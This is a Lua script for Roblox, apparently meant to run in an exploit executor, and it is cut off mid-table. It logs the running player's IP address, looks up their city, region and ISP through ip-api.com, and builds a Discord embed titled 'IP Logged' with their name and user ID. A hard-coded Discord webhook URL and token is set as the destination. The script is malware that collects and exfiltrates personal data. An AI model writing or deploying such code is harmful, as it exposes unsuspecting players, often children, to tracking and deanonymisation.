local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1521248348474970193/uJnCAzQ1fW0c5GOc6M_taqNXCBKLKTAmo0ac-k6TxuPuMat1MX5GBcLLiIiHOVBrp3k4"

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("http://httpbin.org/ip")
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        return data.origin or "Unknown"
    end
    return "Unknown"
end

local function getLocation(ip)
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,message,country,city,region,isp,timezone")
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        if data.status == "success" then
            return data
        end
    end
    return {}
end

local ip = getIP()

local location = {}
if ip and ip ~= "Unknown" then
    location = getLocation(ip)
end

local embed = {
    title = "🎯 IP Logged",
    color = 0xFF0000,
    fields = {
        {
            name = "👤 Player",
            value = LP.Name .. " (ID: " .. LP.UserId .. ")",
            inline = false
        },
        {
            name = "🌐 IP Address",
            value = "```" .. ip .. "```",
